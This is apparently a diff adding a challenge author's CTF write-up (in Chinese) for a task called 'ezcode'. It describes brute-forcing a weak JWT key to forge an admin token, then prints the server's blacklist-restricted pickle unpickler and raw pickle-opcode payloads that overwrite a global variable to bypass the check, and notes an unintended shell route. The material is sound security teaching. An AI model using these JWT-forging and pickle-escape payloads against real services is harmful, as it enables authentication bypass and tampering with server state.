@@ -72,3 +72,99 @@ $phar->setMetadata($object);
 $phar->stopBuffering();
 
 ```
+
+## ezcode
+
+### 出题思路
+
+考察JWT爆破、pickle反序列化的沙箱逃逸（变量篡改）。
+
+### 解题过程
+
+进入首页，跳转至登陆界面，要求输入token登陆。下面有个注册，先随便注册一个账号，返回了一个JWT。   
+使用该JWT登陆进去，提示没有权限。尝试以admin注册账号，失败。很明显是要伪造admin账户的JWT。   
+通过对之前注册的账号的JWT进行弱密钥爆破（直接用top1000就能爆破出来），得到加密密钥：`qwerty`，从而伪造admin账户的JWT。   
+以admin登陆后，出现一个pickle在线工具，查看网页源码，有注释：
+
+```python
+want2know=xxx
+
+class RestrictedUnpickler(pickle.Unpickler):
+    blacklist = {
+        'sys','eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit','getattr'
+        }
+
+    def find_class(self, module, name):
+        # Only allow safe classes from builtins.
+        if module == "builtins" and name not in self.blacklist:
+            return getattr(builtins, name)
+        # Forbid everything else.
+        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
+                                     (module, name))
+
+def restricted_loads(s):
+    return RestrictedUnpickler(io.BytesIO(s)).load()
+
+...
+
+        pickle_data=request.form.get('data')
+        
+        if pickle_data==None:
+            return open('templates/pickle.html').read()
+
+        try:
+            pickle_data=base64.b64decode(pickle_data.encode())
+
+
+            op_blackli=[b'R']
+
+            for op in op_blackli:
+                if op in pickle_data:
+                    return '数据非法！'+op.decode()
+            data=restricted_loads(pickle_data)
+
+        except Exception:
+            
+            return "请输入正确的数据格式！"
+
+        try:
+            secret=request.form.get('secret')
+        except Exception:
+            return open('templates/pickle.html')
+        
+        if want2know==secret:
+            return flag
+        else:
+            return '欢迎使用HACHp1的pickle测试工具！'
+    else:
+        return '没有权限查看！\n'
+```
+
+很明显是pickle反序列化，限制了`builtins`模块，禁止了`R`执行函数，并且黑名单限制了一些敏感子模块，只要`want2know==secret`正确就能得到flag，这里可以通过`globals()`或`locals()`得到变量列表，通过`i`执行函数，修改列表达到篡改变量的目的，从而得到flag。一种可行的payload：
+
+```python
+b"(ibuiltins\nglobals\np0\n0g0\nS'want2know'\nS'hachp1'\ns."
+
+# 或
+
+b"(ibuiltins\nlocals\np0\n0g0\nS'want2know'\nS'hachp1'\ns."
+```
+
+推荐使用pker：
+
+```python
+glo_dic=INST('builtins','globals')
+glo_dic['want2know']='hachp1'
+return
+
+# 或
+
+glo_dic=INST('builtins','locals')
+glo_dic['want2know']='hachp1'
+return
+```
+
+### 非预期
+
+由于本人忘记过滤`__getattribute__`造成出现了能getshell的非预期解，在这里惭愧一下。构造过程也比较有意思，有兴趣的师傅可以自己尝试。
+
